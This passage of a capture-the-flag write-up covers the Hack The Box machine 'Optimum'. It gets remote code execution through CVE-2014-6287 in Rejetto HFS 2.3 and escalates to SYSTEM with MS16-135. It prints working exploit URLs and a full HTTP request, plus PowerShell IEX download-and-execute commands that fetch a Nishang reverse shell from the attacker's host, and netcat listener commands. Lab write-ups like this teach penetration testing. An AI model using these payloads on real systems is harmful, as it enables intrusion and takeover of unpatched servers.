## Initial Shell

### CVE2014-6287

When we search Exploit-DB for HFS, we get several results for Rejetto HTTP File Server, and specifically, version 2.3. While there is a Python script available, we're going to bypass it, and exploit the vulnerability manually, as it'll lead to a cleaner path to root.

> NOTE: If you decide to go down the path of the Python script, note that you'll have to find a way to get a 64-bit shell at some point if you want to use the same privesc method I do here.

The vulnerability here is CVE-2014-6287. It's a Remote Code Execution, due to a poor regex implementation in the source code of the application. Essentially, we can use something like the below URL in a HTTP GET request to run commands on the target. [This page](https://www.exploit-db.com/exploits/34668) explains the specifics for you.

```
http://10.10.10.8:80/?search=%00{.exec|cmd.}
```

We can fire up Burp Suite, and intercept some traffic from the site, and feed it to the Repeater tool.

We should first test to see if we can get code execution, using the below request. Run `tcpdump -i tun0 icmp` first, to capture the pings we send.

Exploit request:

```
GET /?search=%00{.exec|ping+10.10.14.20.} HTTP/1.1
Host: 10.10.10.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.8/
Connection: close
Cookie: HFS_SID=0.609321830095723
Upgrade-Insecure-Requests: 1
```

![](/assets/htb-optimum/tcpdump_ping.png)

Now that we have code execution, let's see if we can do the same from PowerShell. If we can get RCE from Powershell, we have the ability to use a PS reverse shell, which is much more stable.

> NOTE: You must URL encode for the exploit to work correctly. Burp does this for you if you highlight the text, and hit `CTRL+U`.

![](/assets/htb-optimum/burp_ps_ping.png)

Note that we've changed the exploit code to include the path to the 64-bit version of PowerShell. This will prevent issues later when running exploits for privilege escalation.

In `tcpdump`, we can see the ping results.

![](/assets/htb-optimum/tcpdump_ping.png)

So we have RCE in PowerShell. Now we need to grab the `Invoke-PowerShellTcp.ps1` file from the [Nishang repo](https://github.com/samratashok/nishang), which I have cloned to `/opt/nishang`. I changed the name of the copied file to `revshell.ps1` to make it easier to type.

```
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 revshell.ps1
```

Once we have the file copied, we need to place the below code into a new line below the rest of the code. This will allow the script to auto-execute this code when it's loaded, instead of just loading the functions in memory. Change the IP and port to match your machine. Make sure you start a web server locally with `python -m SimpleHTTPServer 80`. Also, launch a listener with `nc -lvnp 7500` to catch the shell.`

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.20 -Port 7500
```

We can now use the below exploit code to get our shell back.

```
/?search=%00{.exec|C:\windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -c "IEX(new-object net.webclient).downloadstring('http://10.10.14.20/revshell.ps1')".}
```

![](/assets/htb-optimum/burp_ps_shell.png)

When we hit *Send*, we get our shell back in the listener.

We can grab the flag directly from this directory as well.

A quick `whoami` shows that we're running as the user `kostas`

### Sherlock

We can use the Sherlock tool to find possible privesc paths. Although the tool is deprecated in favor of Watson, I still find it much easier to work with, as it's a single PS1 script.

Copy the script to your local directory, and add the below code to the bottom like before, to trigger the function when the script is run.

```
Find-AllVulns
```

We can run the script on the target with `IEX(new-object net.webclient).downloadstring('http://10.10.14.20/Sherlock.ps1')`, which will pull the script from our HTTP server, and execute it.

In the results, we can see the below output. This tells us that the target is likely vulnerable to MS16-032, MS16-135, or MS16-034.

![](/assets/htb-optimum/sherlock_results.png)

### MS16-135

We can use the [pre-built PS1 script from within PowerShell Empire](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16135.ps1) for this exploit.

>NOTE: You'll run into errors when running, unless you manually delete all the white-space/tabs from before any line containing `"@`. For some reason the linked script was buggy, and required me to debug it before it would run correctly. [More information here](https://damiankarlson.com/2011/08/04/quick-tip-powershell-here-strings-dont-like-whitespace/).

Copy the script locally, and add `Invoke-MS16135 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.20/revshell2.ps1')"` to the bottom, just like before. In this case `revshell2.ps1` is a copy of `revshell.ps1`, but with the port number pointing to 7700 instead of 7500, like before. The MS16-135 exploit script will trigger the exploit, and run the `revshell2.ps1` script with SYSTEM rights.
